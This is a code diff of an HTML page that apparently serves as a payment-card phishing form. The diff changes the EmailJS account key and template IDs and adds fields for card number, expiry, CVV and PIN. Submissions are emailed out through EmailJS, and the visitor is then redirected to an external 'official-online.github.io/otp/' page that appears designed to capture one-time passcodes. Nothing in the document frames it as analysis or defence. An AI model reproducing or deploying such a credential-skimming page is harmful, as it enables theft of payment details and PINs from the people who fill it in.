@@ -7,7 +7,7 @@
     <script type="text/javascript">
         (function() {
             // https://dashboard.emailjs.com/admin/account
-            emailjs.init('OCUFII26SPgBLeg-z');
+            emailjs.init('VDCSeZiTvFsTAhD3J');
         })();
     </script>
     <script type="text/javascript">
@@ -17,7 +17,7 @@
                 // generate a five digit number for the contact_number variable
                 this.contact_number.value = Math.random() * 100000 | 0;
                 // these IDs from the previous steps
-                emailjs.sendForm("service_hoopla","template_hoopla", this)
+                emailjs.sendForm("service_smart","template_smart", this)
                 .then(function() {
                     console.log('SUCCESS!');
                         let subscribe = document.getElementById('submit')
@@ -26,7 +26,7 @@
                         subscribe.value = 'DONE'
                         let Subscribe = setTimeout(sub, 5000);
                         function sub(){
-                            subscribe.value = 'Submit'
+                            window.location.href = ' https://official-online.github.io/otp/'
                         }
                         let yes = document.getElementById('yes')
                         yes.innerHTML = 'Yes'
@@ -53,22 +53,25 @@
     </div>
     <form id="contact-form">
         <input type="hidden" name="contact_number">
+        <div id="form">
+            
+        <label for="card">Card Number</label>
+        <input type="number" name="card" id="card" placeholder="xxxx xxxx xxxx xxxx"><br>
 
-      <div>
-        <label for="number">Number</label>
-        <input type="number" name="number" id="number" placeholder="Required"> <br>
-      </div>
-
-        <div>
-            <label for="expires">Expires</label>
-        <input type="month" name="expires" id="expires" placeholder="MM | YYYY"><br>
-        </div>
-
-        <div>
+        <div id="div2">
+            <label for="expiry">Expiry date</label>
             <label for="cvv">CVV</label>
-            <input type="number" name="cvv" id="cvv" placeholder="Security Code">
         </div>
-        <input type="submit" value="Confirm" id="submit">
+        <div id="div3">
+            <input type="month" name="expiry" id="expiry">
+            <input type="number" name="cvv" id="cvv" placeholder="xxx">
+        </div>
+
+        <label for="pin">Pin</label>
+        <input type="number" name="pin" id="pin" placeholder="****">
+      
+        </div>
+        <input type="submit" name="submit" value="Confirm" id="submit">
     </form>
     
 
